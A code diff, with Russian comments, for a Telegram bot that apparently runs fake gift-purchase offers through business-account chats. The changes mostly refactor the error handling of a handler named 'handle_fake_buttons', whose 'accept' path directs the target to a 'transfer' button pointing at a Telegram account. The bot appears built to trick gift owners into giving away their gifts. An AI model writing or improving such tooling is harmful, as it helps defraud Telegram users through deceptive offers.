@@ -52,7 +52,6 @@ def get_pretty_name(slug):
     raw_name = slug.split('-')[0]
     return re.sub(r'(?<!^)(?=[A-Z])', ' ', raw_name)
 
-# --- СТАРТ С ТВОИМ ТЕКСТОМ ---
 @dp.message(CommandStart())
 @dp.message(Command("menu"))
 async def cmd_start(message: types.Message):
@@ -74,7 +73,6 @@ async def cmd_start(message: types.Message):
     )
     await message.answer(text, parse_mode="HTML")
 
-# --- КОМАНДА /ofteam ---
 @dp.message(Command("ofteam"))
 async def cmd_ofteam(message: types.Message):
     user_id = message.from_user.id
@@ -88,7 +86,6 @@ async def cmd_ofteam(message: types.Message):
 async def block_offer_in_pm(message: types.Message):
     await message.answer("❌ Эта функция доступна только в режиме автоматизации чатов.")
 
-# --- ГЕНЕРАЦИЯ ОФФЕРА ---
 @dp.business_message(F.text.startswith("/of"))
 async def handle_offer_command(message: types.Message):
     business_connection_id = message.business_connection_id
@@ -146,9 +143,11 @@ async def handle_offer_command(message: types.Message):
             except: pass
         print(f"Ошибка: {e}")
 
+# --- ОБРАБОТКА КНОПОК ---
 @dp.callback_query(F.data.startswith("accept:") | F.data.startswith("decline:"))
 async def handle_fake_buttons(callback: types.CallbackQuery):
     if not callback.message: return
+    
     data_parts = callback.data.split(":")
     action, gift_slug, amount, currency, lang = data_parts[0], data_parts[1], data_parts[2], data_parts[3], data_parts[4]
     
@@ -158,21 +157,27 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
     business_connection_id = callback.message.business_connection_id
     msg_data = MESSAGES.get(lang, MESSAGES["ru"])
 
+    # 1. Пытаемся удалить старое сообщение (в отдельном try, чтобы ошибка удаления не сломала отправку)
     try:
         if business_connection_id:
             await bot.delete_business_messages(business_connection_id, [callback.message.message_id])
         else:
             await callback.message.delete()
+    except Exception as e:
+        print(f"Не удалось удалить старое сообщение: {e}")
 
-        if action == "accept":
-            new_text = msg_data["success"].format(link=link, pretty_name=pretty_name)
-            new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
-                [InlineKeyboardButton(text=msg_data["btn_transfer"], url="https://t.me/Gifts_Replayer")]
-            ])
-        else:
-            new_text = msg_data["declined"].format(amount=amount, symbol=symbol, link=link, pretty_name=pretty_name)
-            new_keyboard = None
+    # 2. Формируем текст и кнопки
+    if action == "accept":
+        new_text = msg_data["success"].format(link=link, pretty_name=pretty_name)
+        new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text=msg_data["btn_transfer"], url="https://t.me/Gifts_Replayer")]
+        ])
+    else:
+        new_text = msg_data["declined"].format(amount=amount, symbol=symbol, link=link, pretty_name=pretty_name)
+        new_keyboard = None
 
+    # 3. Пытаемся отправить новое сообщение
+    try:
         kwargs = {
             "chat_id": callback.message.chat.id, 
             "text": new_text, 
@@ -186,8 +191,11 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
         await bot.send_message(**kwargs)
         await callback.answer()
     except Exception as e:
-        print(f"Ошибка кнопки: {e}")
-        await callback.answer("Ошибка", show_alert=True)
+        print(f"Ошибка при отправке нового сообщения: {e}")
+        await callback.answer("Ошибка отправки", show_alert=True)
+        if ADMIN_ID:
+            try: await bot.send_message(ADMIN_ID, f"⚠️ <b>Ошибка при нажатии кнопки:</b>\n<code>{e}</code>", parse_mode="HTML")
+            except: pass
 
 async def main():
     print("Бот запущен...")
